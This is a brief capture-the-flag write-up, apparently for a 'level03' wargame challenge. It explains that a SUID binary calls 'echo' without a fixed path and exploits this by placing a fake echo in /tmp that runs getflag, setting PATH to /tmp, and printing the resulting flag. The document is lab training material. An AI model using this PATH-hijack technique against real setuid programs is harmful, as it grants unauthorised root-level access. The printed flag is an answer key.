# level03

![[ls.png]]
> s in `ls -l` means SUID bit (means that it can run with as the owner)

`strings ./level03`
![[strings.png]]
> Sanitization of env but not of echo

`echo /bin/getflag > /tmp/echo`
`export PATH='/tmp'`
`./level03`
![[getflag.png]]

### Flag = qi0maab88jeaj46qoumi7maus